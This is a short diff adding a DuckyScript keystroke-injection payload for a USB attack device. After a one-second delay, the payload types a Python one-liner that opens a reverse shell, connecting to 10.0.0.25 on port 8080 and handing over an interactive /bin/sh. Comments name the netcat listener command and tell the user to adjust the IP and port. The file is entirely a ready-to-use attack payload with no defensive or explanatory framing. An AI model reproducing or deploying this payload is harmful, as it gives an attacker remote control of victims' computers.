@@ -1,0 +1,6 @@
+REM python based reverse shell
+REM works with: nc -lvp 8080
+REM change ip and port accordingly
+DELAY 1000
+STRING python -c 'import socket,subprocess,os;ip="10.0.0.25";port=8080;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((ip,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+ENTER
